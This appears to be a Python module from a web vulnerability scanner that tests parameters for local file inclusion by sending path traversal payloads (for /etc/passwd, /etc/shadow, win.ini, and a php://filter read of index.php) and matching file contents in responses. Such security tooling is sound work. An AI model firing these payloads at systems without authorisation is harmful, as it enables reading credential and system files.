"""LFI / Path Traversal Verification Module.

Tests for Local File Inclusion and Path Traversal by injecting
path traversal payloads and checking for file content in response.
"""
import logging
from app.ai_assistant.verification.base_module import BaseVerificationModule

logger = logging.getLogger(__name__)


class LFIModule(BaseVerificationModule):
    """LFI / Path Traversal verification module."""

    VULN_TYPE = "LFI / Path Traversal"
    KEYWORD = "lfi"

    def generate_payloads(self):
        """Generate LFI / path traversal payloads."""
        return [
            '../../../../etc/passwd',
            '../../../../../etc/passwd',
            '../../../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '/etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            '../../../../etc/shadow',
            '../../../../../windows/win.ini',
            '..\\..\\..\\..\\windows\\win.ini',
        ]

    def verify(self, param_name, location, method):
        """Run LFI verification."""
        payloads = self.generate_payloads()

        for payload in payloads:
            resp = self._send_request(param_name, payload, method)
            if not resp:
                continue

            evidence = self.collect_evidence(resp, payload)
            if evidence:
                confidence = self.calculate_confidence(evidence)

                return self._build_result(
                    status='verified',
                    param_name=param_name,
                    location=location,
                    method=method,
                    payload=payload,
                    evidence=evidence,
                    confidence=confidence,
                    technique='File Content Detection',
                    request_sent=resp.url,
                    response_summary=f"Status: {resp.status_code}, Length: {len(resp.text)}",
                )

        return self._build_result(
            status='not_vulnerable',
            param_name=param_name,
            location=location,
            method=method,
            payload=payloads[0],
            evidence='No file content from path traversal payloads.',
            confidence=0.0,
            technique='File Content Detection',
        )

    def collect_evidence(self, response, payload, baseline_response=None):
        """Check for file content indicators in response."""
        resp_text = response.text

        # Linux /etc/passwd
        if 'root:x:' in resp_text or 'root:$' in resp_text:
            pos = resp_text.find('root:')
            context = resp_text[pos:pos + 80]
            return f"Linux /etc/passwd content detected: {context}"

        # Windows win.ini
        if '[fonts]' in resp_text.lower() or '[extensions]' in resp_text.lower():
            return f"Windows win.ini content detected in response."

        # Base64 encoded content (PHP filter)
        if 'php://filter' in payload and len(resp_text) > 100:
            # Check if response looks like base64
            import re
            b64_pattern = re.compile(r'^[A-Za-z0-9+/=\s]+$')
            clean = resp_text.strip()
            if b64_pattern.match(clean) and len(clean) > 50:
                return f"PHP filter LFI confirmed: Base64-encoded file content returned ({len(clean)} chars)."

        # /etc/shadow (requires root, but might show partial)
        if 'root:' in resp_text and ':' in resp_text and '$' in resp_text:
            pos = resp_text.find('root:')
            context = resp_text[pos:pos + 80]
            if 'root:$' in context:
                return f"Linux /etc/shadow content detected: {context}"

        return None

    def calculate_confidence(self, evidence):
        """Calculate confidence."""
        if 'passwd' in evidence.lower():
            return 1.0
        if 'win.ini' in evidence.lower():
            return 1.0
        if 'base64' in evidence.lower():
            return 0.9
        if 'shadow' in evidence.lower():
            return 1.0
        return 0.3
